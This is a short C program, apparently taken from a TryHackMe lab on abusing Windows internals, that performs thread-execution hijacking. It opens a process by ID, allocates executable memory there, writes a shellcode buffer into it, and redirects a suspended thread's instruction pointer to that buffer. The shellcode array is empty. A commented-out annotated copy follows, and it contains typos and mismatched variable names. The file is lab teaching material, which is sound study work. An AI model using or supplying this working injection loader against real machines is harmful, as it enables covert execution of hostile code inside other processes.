#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>

// From https://tryhackme.com/room/abusingwindowsinternals

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    HANDLE h_thread;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);

    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        Thread32First(h_snapshot, &threadEntry);

        while (Thread32Next(h_snapshot, &threadEntry))
        {
                if (threadEntry.th32OwnerProcessID == (atoi(argv[1])))
                {
                        h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
                        break;
                }
        }

    SuspendThread(h_thread);

    GetThreadContext(h_thread, &context);
        context.Rip = (DWORD_PTR)b_shellcode;
        SetThreadContext(h_thread, &context);

        ResumeThread(h_thread);

}

/**
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);
PVOIF remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL,
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);

THREADENTRY32 threadEntry;

HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
	TH32CS_SNAPTHREAD, // Include all processes residing on the system
	0 // Indicates the current process
);
Thread32First( // Obtains the first thread in the snapshot
	hSnapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
);

while (Thread32Next( // Obtains the next thread in the snapshot
	snapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
)) {

if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process ID's match
		{
			HANDLE hThread = OpenThread(
				THREAD_ALL_ACCESS, // Requests all possible access rights
				FALSE, // Child threads do not inheret parent thread handle
				threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
			);
			break;
		}

SuspendThread(hThread);


CONTEXT context;
GetThreadContext(
	hThread, // Handle for the thread
	&context // Pointer to store the context structure
);


context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation

SetThreadContext(
	hThread, // Handle for the thread
	&context // Pointer to the context structure
);

ResumeThread(
	hThread // Handle for the thread
);
**/
